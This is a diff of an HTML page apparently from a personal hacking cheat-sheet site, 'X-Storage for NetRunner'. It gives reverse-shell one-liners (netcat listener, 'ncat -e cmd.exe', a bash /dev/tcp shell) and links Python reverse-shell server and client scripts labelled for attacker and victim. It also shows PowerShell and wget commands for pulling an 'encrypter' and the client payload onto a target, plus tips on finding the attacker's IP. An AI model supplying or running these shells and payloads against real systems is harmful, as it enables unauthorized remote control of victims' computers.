@@ -10,9 +10,9 @@
         </div>
         <header><h1>X-Storage for NetRunner</h1></header></header><br>
         <h2>Reverse shell from linux(kali) to windows</h2><br>
-        <p>host: nc -lnvp [port]</p>
-        <p>client:[windows] ncat [host ip] [port] -e cmd.exe</p>
-        <p>client:[linux]sh -i >& /dev/tcp/[host ip]/[port] 0>&1</p>
+        <p><b>host:</b> nc -lnvp [port]</p>
+        <p><b>client:</b>[windows] ncat [host ip] [port] -e cmd.exe</p>
+        <p><b>client:</b>[linux]sh -i >& /dev/tcp/[host ip]/[port] 0>&1</p>
         <br><h4><em>Requirements:</em></h4><br>
         <table>
             <tr>
@@ -29,8 +29,9 @@
                 <td><a href="https://nmap.org/download.html">Netcat</a></td>
                 <td>Try to add it to environment variables</td>
             </tr>
-        </table><br><br><br><br><br>
-        <br><br><h2>backup files</h2><br>
+        </table>
+        <p style ="line-height: 700%;">&#8205;</p>
+        <h2>backup files</h2><br><br>
         <p>Important codes/files to finish in the future</p>
         <p>I have tried the encrypted codes only in kali Linux for now so I am not sure if they would work as intended in other operating systems</p></p><br><br>
         <table>
@@ -67,21 +68,22 @@
                 <td>Reverse_server</td>
                 <td>python</td>
                 <td><a href ="/storage/files/server.py" download ="" class="download-btn">server</a></td>
-                <td>Reverse shell for attacker</td>
+                <td>Reverse shell for attacker || If you are launching this attack you would need to know your ip. Which is why use Get-NetIPAddress in powershell or ifconfig on linux</td>
             </tr>
             <tr>
                 <td>5.</td>
                 <td>Reverse_client</td>
                 <td>python</td>
                 <td><a href = "/storage/files/server.py" download = "" class="download-btn">client</a></td>
-                <td>Revere shell for victim || Only downside is you need to have the packages imported into their system </td>
+                <td>Revere shell for victum[ONLY USE THIS IF THE CLIENT IS RUNNNING A WINDOWS OS] || Only downside is you need to have the packages imported into their system </td>
             </tr>
-        </table><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br>
-        <h2>Downloading a file using powershell</h2><br>
+        </table>
+        <p style ="line-height: 2000%;">&#8205;</p>
+        <h2>Downloading a file using powershell</h2><br><br>
         <p>First fix variables for easier access : $u , $p</p><br>
         <p>$u="https://x-netrunner.github.io/storage/files/encrypter.py"</p><br>
         <p>$p="C:/test.py"</p><br>
-        <p>Now you have 3 ways to download the file :</p><br><br><br>
+        <p>Now you have 3 ways to download the file :</p><br><br>
         <table>
             <tr>
                 <th>No.</th>
@@ -110,6 +112,39 @@
                 <td>$u</td>
                 <td>$p</td>
                 <td>BITS refers to the Background Intelligent Transfer Service. This service is a part of the Windows operating system, and you will need to have BITS enabled for this technique to work.</td>
+            </tr>
+        </table>
+        <p style ="line-height: 1900%;">&#8205;</p>
+        <h2>Downloading a file using linux</h2><br><br>
+        <p>This is very common ofc its very simple as well you need to use wget for this</p><br>
+        <b><p><em>EXAMPLE:</em></b> wget https://x-netrunner.github.io/storage/files/client.py</p>
+        <H2 style ="line-height: 500%;">Viewing a website details</H2>
+        <p>Use wsl or virtual machine of kali or any linux distro for this </p>
+        <br><h4><em>Requirements:</em></h4><br>
+        <table>
+            <tr>
+                <th>No.</th>
+                <th>steps</th>
+            </tr>
+            <tr>
+                <td>1.</td>
+                <td>you would need to git clone https://github.com/eschultze/URLextractor.git</td>
+            </tr>
+            <tr>
+                <td>2.</td>
+                <td>cd into the created directory</td>
+            </tr>
+            <tr>
+                <td>3.</td>
+                <td>make sure to download the requirements from the file</td>
+            </tr>
+            <tr>
+                <td>4.</td>
+                <td>run ./extractor.sh to download the tool</td>
+            </tr>
+            <tr>
+                <Td>5.</Td>
+                <td>./extractor.sh [website name ] for example ./extractor.sh https://x-netrunne.github.io/storage/</td>
             </tr>
         </table>
     </body>
